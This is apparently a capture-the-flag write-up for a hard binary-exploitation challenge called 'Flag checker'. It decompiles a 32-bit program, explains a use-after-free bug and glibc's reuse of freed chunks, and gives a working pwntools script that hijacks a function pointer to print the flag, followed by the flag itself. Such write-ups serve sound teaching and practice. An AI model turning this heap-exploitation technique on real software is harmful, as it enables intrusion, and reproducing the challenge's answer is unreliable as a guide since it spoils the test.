# Flag checker

Proposed difficulty: `Hard`

9 solves

```text
Du er kommet her for at tjekke dine flag og se, om du har et match. Du kan vælge frit mellem et antal algoritmer, der kan tjekke dit flag. Jeg håber, at du er tilfreds med vores tjeneste, send os en besked med dit feedback!

Kør vores service: nc ddc-flagchecker.hkn 5000

Download binary her: flagchecker
```

Attachments:

`flagchecker: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=a642e51864782c78a797c299cb07b5137f57699b, for GNU/Linux 3.2.0, not stripped`

# Solution

## Overview

Let's start by checking out the binary in ghidra.

Here is the flagchecker function after retyping and making the `fc` global a struct:

```c
int main(void) {
  int iVar1;
  int in_GS_OFFSET;
  int choice;
  int exit_when_0;
  char returnbuf [256];
  
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  setbuf((FILE *)stdout,(char *)0x0);
  readFlag();
  exit_when_0 = 1;
  while (exit_when_0 != 0) {
    puts("Which method would you like to use?");
    puts("1. strcmp");
    puts("2. md5");
    puts("3. sha1");
    puts("4. sha256");
    puts("5. cleanup");
    puts("6. leave a message");
    puts("7. exit");
    printf("> ");
    scanf("%d",&choice);
    if (choice < 5) {
      printf("Enter your hash: ");
      scanf("%s",returnbuf);
    }
    switch(choice) {
    default:
      puts("Invalid choice!");
      break;
    case 1:
      fc = (fcstruct *)malloc(8);
      fc->param = returnbuf;
      fc->method = cmp;
      break;
    case 2:
      fc = (fcstruct *)malloc(8);
      fc->param = returnbuf;
      fc->method = md5;
      break;
    case 3:
      fc = (fcstruct *)malloc(8);
      fc->param = returnbuf;
      fc->method = sha1;
      break;
    case 4:
      fc = (fcstruct *)malloc(8);
      fc->param = returnbuf;
      fc->method = sha256;
      break;
    case 5:
      if (fc == (fcstruct *)0x0) {
        puts("Nothing to clean up!");
      }
      else {
        free(fc);
        fc->method = (void *)0x0;
        fc->param = (void *)0x0;
        puts("Cleanup successful!");
      }
      break;
    case 6:
      leaveMessage(returnbuf,flag);
      break;
    case 7:
      exit_when_0 = 0;
    }
    run();
  }
  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail_local();
  }
  return 0;
}
```

Let's look at what each option does.

## Options 1 to 4

1. Allocates 8 bytes, which is the size of the `fc` struct. The allocated pointer is assigned to the global `fc` variable.
   - The `fc` struct contains two variables:
     1. `param`: `void *` (size: 0x4)
     2. `method`: `void *` (size: 0x4)
   - The pointers are 0x4 bytes long as it is an x86 32-bit binary
2. Sets the `fc->param` to a buffer on the stack.
3. Sets the `fc->method` to the address of the requested method.

## Option 5

Option 5 does one of two things:

If the `fc` global points to 0x0 (null pointer) it does nothing.

Otherwise, it will free the `fc` pointer, and then set `fc->method` and `fc->param` to 0x0.

The problem here is that the `fc` pointer is never set to 0x0, so we can make the program use the variable after it has been freed. This is called a Use After Free vulnerability (UAF).

## Option 6

Option 6 just executes the `leaveMessage()` function. Let's look at it:

```c
int leaveMessage(char *returnbuf,char *flag) {
  char *message;
  
  printf("Leave a message: ");
  message = (char *)malloc(8);
  scanf("%s",message);
  puts("Thanks for your message!");
  return 0;
}
```

The `leaveMessage()` function does the following:

1. Allocates 8 bytes with `malloc()`.
2. The allocated address is assigned to the `message` variable.
3. Input from `stdin` is inserted into the `message` variable.
4. The method exits without `free()`'ing the pointer.

## Option 7

Exits the program

---

After any of option 1-6 finishes, the function `run()` is executed. Here is the decompiled `run()` function:

```c
int run() {
  int result;
  
  printf("%p %p\n",fc,fc->method);
  if ((fc == (fcstruct *)0x0) || (fc->method == (void *)0x0)) {
    puts("No method selected!");
  } else {
    result = (*(code *)fc->method)(fc->param,flag);
    if (result == 0) {
      puts("Incorrect!");
    }
    else {
      puts("Correct!");
    }
  }
  return 0;
}
```

The subroutine does the following:

1. Prints the address that `fc` is pointing to.
2. Prints the address that `fc->method` is pointing to.
3. Returns if `fc` is a null pointer
4. Returns if `fc->method` is a null pointer
5. Executes `fc->method(fc->param, flag)`
   - `flag` is a global variable containing the flag.

## The goal

The goal is to make the program execute an arbitrary function.

If we imagine we have full control over the `fc` value, we can make the program execute `printf("%s", flag)`.

We can do this by setting `fc->method` to the address of `printf`, and settign `fc->param` to an address that contains `%s\00`.

## Exploring our options

In glibc malloc an interesting thing happens when allocating the same size twice. Take this example program:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    void *p1 = malloc(8);
    printf("p1 = %p\n\n", p1);

    free(p1);

    void *p2 = malloc(8);
    printf("p1 = %p\np2 = %p\n", p1, p2);

    return 0;
}
```

When running this program I get the following output:

```text
p1 = 0x55969b8b72a0

p1 = 0x55969b8b72a0
p2 = 0x55969b8b72a0
```

This is interesting as `malloc()` returns the same address when allocating twice, with a free in between.

So if we can make the `flagchecker` program do the following, we're golden:

1. Set `fc` to `malloc(8)`
2. Free `fc`
3. Put arbitrary data into the value of a pointer created by `malloc(8)`

In this case `fc` will still be pointing to the same location that we just wrote to.

Another important detail is that the program does not use PIE. This means that the address of the `printf` plt entry will always be at the same location.

## Exploiting the program

Here is my solve script. I have annotated it with comments such that it should be easy to understand:

```py
from pwn import *

elf = ELF('./flagchecker', checksec=False)

c = remote('ddc-flagchecker.hkn', 5000)

STRCMP_OPTION = b'1'
CLEANUP_OPTION = b'5'
LEAVE_MESSAGE_OPTION = b'6'

# Give fc a value such that fc is initiated with a value
log.info(f'Setting up')
c.sendlineafter(b'> ', STRCMP_OPTION)

c.sendlineafter(b'Enter your hash: ', b'dummy')

# Now fc has a reference. We will free it and overwrite it with our values
log.info(f'Triggering free')
c.sendlineafter(b'> ', CLEANUP_OPTION)

# Now we overwrite fc->method with printf and fc->param with the address of a string from the elf ("%s")
log.info(f'Overwriting fc')

c.sendlineafter(b'> ', LEAVE_MESSAGE_OPTION)

c.sendlineafter(b'Leave a message: ', p32(next(elf.search(b'%s'))) + p32(elf.symbols.printf))

# After the leaveMessage() function has finished, it will run the run() function,
# which will call fc->method(fc->param, flag). This will call printf("%s", flag).

flag = c.recvline_contains(b'DDC')

if not flag:
    log.failure('No flag')
    exit(1)

log.success(f'Success! Flag: {flag.decode()}')
```

Here is the output of the script:

```text
[+] Opening connection to ddc-flagchecker.hkn on port 5000: Done
[*] Setting up
[*] Triggering free
[*] Overwriting fc
[+] Success! Flag: DDC{us3_0nly_4ft3r_fr33!}
[*] Closed connection to ddc-flagchecker.hkn port 5000
```

# Flag

`DDC{us3_0nly_4ft3r_fr33!}`
